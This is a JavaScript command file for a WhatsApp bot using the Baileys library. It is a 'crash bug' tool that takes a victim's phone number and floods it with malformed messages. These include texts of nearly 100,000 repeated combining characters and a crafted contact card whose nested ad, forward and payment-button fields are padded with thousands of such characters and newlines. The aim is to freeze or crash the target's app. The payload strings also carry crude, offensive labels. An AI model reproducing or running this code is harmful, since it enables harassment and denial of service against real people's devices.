import '../config.js';
import {
  proto,
  downloadContentFromMessage,
  jidNormalizedUser,
  generateWAMessageFromContent
} from "baileys";

export const command = ["iyqiua", "wwlks"]

export default async (m, {
  reply, pushname, qriz, q, isOwner
}) => {
  if (!isOwner) reply(mess.owner);
  if (!q) return reply('*contoh*: .xcrash 62xxx');

  let jidx = q.replace(/[^0-9]/g, "");

  if (jidx.startsWith('0')) {
    return reply(`The number starts with '0'. Replace it with the country code number.\n\nExample: .xcrash 62 xxx-xxxx-xxxx`);
  }

  let target = `${jidx}@s.whatsapp.net`;

  reply(`*Success! sent to ${target}*`)

  for (let r = 0; r < 15; r++) {
    await gMine(target)
    await gMine(target)
    await gg(target)
    await UiForceVico(target)
    await UiForceVico(target)
  }

  console.log(chalk.red.bold("Sukses Ngirim Bug!"))

  async function gMine(jid) {
    await riz.sendMessage(jid, {
      text: "ꦽ".repeat(99999),
      mentions: jid,
      contextInfo: {
        mentionedJid: jid
      }
    });
  }

  async function gg(jid) {
    await riz.sendMessage(jid, {
      text: "᭄".repeat(99990),
      mentions: jid,
      contextInfo: {
        mentionedJid: jid
      }
    });
  }


  async function UiForceVico(target) {
    await riz.relayMessage(target, {
      contactMessage: {
        displayName: `riz - Corporation${"ꦽ".repeat(2500) + "ោ៝".repeat(2500)}`,
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:7eppeli - Corporation${"ꦽ".repeat(2500) + "ោ៝".repeat(2500)}\nTEL;type=Ponsel;waid=15517868400:15517868400\nX-WA-BIZ-DESCRIPTION:${"ꦽ".repeat(2500) + "ោ៝".repeat(2500)}\nX-WA-BIZ-NAME:7eppeli - Corporation\nEND:VCARD`,
        jpegThumbnail: ZeppImg,
        contextInfo: {
          externalAdReply: {
            body: "Rizz",
            title: "P3d0 - Ex3cutor" + "ꦽ".repeat(5000) + "ោ៝".repeat(2500),
            thumbnail: ZeppImg,
            renderLargerThumbnail: false,
            showAdAttribution: true,
            automatedGreetingMessageShown: true,
            greetigMessageBody: "P3d0 - Ex3cutor",
            sourceUrl: "https://t.me/",
            thumbnailUrl: "https://t.me/",
            mediaType: 1,
            adContextPreviewDismissed: true
          },
          isForwarded: true,
          forwardingScore: 999,
          businessMessageForwardInfo: {
            businessOwnerJid: "15517868400@s.whatsapp.net"
          },
          participant: "15517868400@s.whatsapp.net",
          remoteJid: "status@broadcast",
          quotedMessage: {
            interactiveMessage: {
              header: {
                title: "❗⏤‌‌‌‌□☆vico⃤◇□❗" + "ꦽ".repeat(2500) + "ោ៝".repeat(2500),
                hasMediaAttachment: true,
                jpegThumbnail: ZeppImg
              },
              nativeFlowMessage: {
                messageParamsJson: "\n".repeat(9000),
                buttons: [{
                  name: "review_and_pay",
                  buttonParamsJson: "{\"reference_id\":\"7eppeli.pedofile\",\"order\":{\"status\":\"payment_requested\",\"order_type\":\"ORDER\"},\"share_payment_status\":true}"
                }]
              }
            }
          }
        }
      }
    }, {
      participant: {
        jid: target
      }})

  }
}